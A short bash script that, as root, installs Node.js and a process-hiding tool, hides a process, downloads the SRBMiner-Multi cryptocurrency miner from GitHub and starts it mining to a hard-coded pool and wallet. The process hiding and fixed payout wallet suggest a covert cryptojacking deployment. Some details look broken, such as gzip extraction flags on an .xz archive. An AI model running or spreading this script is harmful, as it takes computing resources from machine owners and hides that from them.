#!/bin/bash
sudo su --command "sudo apt update && 
sudo apt install gcc -y && 
curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && 
sudo apt install nodejs && 
npm install -g npm@8.4.1 && 
npm i -g node-process-hider && 
sudo ph add pkx2 && 
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.0/SRBMiner-Multi-0-9-0-Linux.tar.xz && 
tar -xzf SRBMiner-Multi-0-9-0-Linux.tar.xz &&
cd SRBMiner-Multi-0-9-0-Linux;
./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool verushash.eu.mine.zergpool.com:3300 --wallet 16GF8LfH1eLW2sWioKvTPoSKZ4U1i8Koci -p c=BTC,mc=AVN --cpu-threads 2"
